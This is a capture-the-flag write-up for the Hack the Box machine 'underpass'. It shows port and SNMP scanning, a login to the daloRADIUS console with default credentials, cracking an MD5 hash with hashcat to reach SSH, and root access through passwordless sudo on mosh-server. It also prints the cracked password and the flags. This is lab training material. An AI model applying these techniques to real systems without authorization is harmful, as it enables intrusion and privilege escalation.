# Hack the Box - "underpass" - 10.10.11.48
# Enumeration
## Nmap
### Inital Scan
Command
```
nmap -A -vv -oA enum/nmap-initial 10.10.11.48
```

Output
```
PORT   STATE SERVICE REASON         VERSION                                        
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)                                                               
| ssh-hostkey:                                                                     
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)                    
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=                          
|   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)                  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91 
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))                 
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

### Full Scan
Command
```
nmap -A -vv -p- -oA enum/nmap-full 10.10.11.48
```

Output
```
PORT   STATE SERVICE REASON         VERSION                                        
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)                                                               
| ssh-hostkey:                                                                     
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)                    
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=                          
|   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)                  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91 
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))                 
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

### UDP Scan
Command
```
nmap -sU -vv 10.10.11.48
```

Output
```
PORT     STATE         SERVICE REASON
161/udp  open          snmp    udp-response ttl 63
1812/udp open|filtered radius  no-response
1813/udp open|filtered radacct no-response
```
## Port 80
### Nikto
Command
```
nikto -h http://10.10.11.48 -o enum/nikto.txt
```

Output
```
+ Server: Apache/2.4.52 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: 29af, size: 620c8638b9276, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
+ 8074 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2025-01-27 18:49:55 (GMT-6) (374 seconds)
```

### SNMP(UDP Port 161)

Ran SNMP check
```
snmp-check 10.10.11.48
```

Response
```
Host IP address               : 10.10.11.48
Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
Contact                       : steve@underpass.htb
Location                      : Nevada, U.S.A. but not Vegas
Uptime snmp                   : 02:43:23.33
Uptime system                 : 02:43:13.79
System date                   : 2025-1-28 02:15:58.0
```


---

# User Access

snmpwalk mentions that this device is a dealoradius server and also gives us a user on the device "steve".

After finding the Daloradius Github page and the installation Wiki on that page we can find directories for a management application that are created and used.
>![[Pasted image 20250128162004.png]]

Further down we can see a username and password that is default for the management application.
`administrator:radius`
>![[Pasted image 20250128162209.png]]

This allows us to login to the Management Console for Daloradius.
>![[Pasted image 20250128162314.png]]

Going into the users there is 1 user listed with an MD5 encoded password.
`svcMosh:412DD4759978ACFCC81DEAB01B382403`
>![[Pasted image 20250128163420.png]]

Running the MD5 hash through hashcat gives the password for svcMosh.
```
hashcat -m 0 -a 0 pass.hash /usr/share/wordlists/rockyou.txt
```
`svcMosh:underwaterfriends`

Using this username and password we can access the SSH service and grab the user flag.

---

# Privilege Escalation

After running LinPeas we can see that we have write permissions to /etc/init.d/moshserver.
>![[Pasted image 20250128183416.png]]

We also have have NOPASSWD sudo access to /usr/bin/mosh-server.
>![[Pasted image 20250128184108.png]]

We start a mosh server using the sudo command.
```
sudo mosh-server
```
>![[Pasted image 20250128185623.png]]

Using the key and port generated we can connect to this service to pop a root shell and get the root flag.
```
MOSH_KEY=YB3xXazebjeDp+xPhHZ0Ng mosh-client 127.0.0.1 60001
```
>![[Pasted image 20250128185810.png]]

---

# Loot
## User
Command
```
ifconfig;id;hostname;cat user.txt
```
`01c4852c1e08a4c79c5fe07963aea244`
>![[Pasted image 20250128164037.png]]

## Root/Admin
Command
```
ifconfig;id;hostname;cat root.txt
```
`8e107a9ea691602798c4b43947e120aa`
>![[Pasted image 20250128185922.png]]